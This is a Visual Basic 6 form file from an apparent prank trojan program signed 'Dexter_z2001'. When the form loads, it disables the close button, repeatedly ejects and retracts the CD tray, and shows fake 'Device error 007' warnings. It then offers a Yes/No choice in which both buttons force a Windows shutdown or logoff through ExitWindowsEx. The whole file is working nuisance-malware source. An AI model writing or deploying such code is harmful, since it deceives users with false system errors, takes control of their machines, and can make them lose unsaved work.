VERSION 5.00
Begin VB.Form Form6 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Created BY: Dexter_z2001"
   ClientHeight    =   1290
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   Icon            =   "Form6.frx":0000
   LinkTopic       =   "Form6"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1290
   ScaleWidth      =   4680
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command2 
      Caption         =   "&No"
      Height          =   375
      Left            =   2520
      TabIndex        =   1
      Top             =   840
      Width           =   1095
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Yes"
      Height          =   375
      Left            =   1080
      TabIndex        =   0
      Top             =   840
      Width           =   1095
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      Caption         =   "Sorry if I had to do this..I love you .."
      Height          =   255
      Left            =   840
      TabIndex        =   4
      Top             =   600
      Width           =   3135
   End
   Begin VB.Label Label2 
      Caption         =   "Click yes if you want..No if you stay frozen the whole day.."
      Height          =   255
      Left            =   360
      TabIndex        =   3
      Top             =   360
      Width           =   4335
   End
   Begin VB.Label Label1 
      Caption         =   "Dexter would like you to shut down your computer to get rid of the Trojan file..Would you like to shut down your computer now?"
      Height          =   375
      Left            =   120
      TabIndex        =   2
      Top             =   0
      Width           =   4575
   End
End
Attribute VB_Name = "Form6"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Sub Sound()
sndPlaySound App.Path & "\" & "ret.wav", &H1
End Sub

Private Sub Command1_Click()
ret_val = ExitWindowsEx(1, 4)
End Sub

Private Sub Command2_Click()
ret_val = ExitWindowsEx(1, 4)
End Sub

Private Sub Form_Load()
Dim hSysMenu As Long
hSysMenu = GetSystemMenu(hwnd, False)
RemoveMenu hSysMenu, SC_CLOSE, MF_BYCOMMAND

mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
       MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
       MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
     mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
       MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
     mciSendString "set CDAudio door closed", t, 127, 0
    
    mciSendString "set CDAudio door open", t, 127, 0
       MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door closed", t, 127, 0

     mciSendString "set CDAudio door open", t, 127, 0
      MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door closed", t, 127, 0
    
    mciSendString "set CDAudio door open", t, 127, 0
      MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door closed", t, 127, 0

     mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
        MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
        MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
     mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
        MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
    mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
       MsgBox "Warning window has detected a device error", vbOKOnly, "Device error 007!"
     mciSendString "set CDAudio door open", t, 127, 0

    mciSendString "set CDAudio door closed", t, 127, 0
    
Sound
End Sub
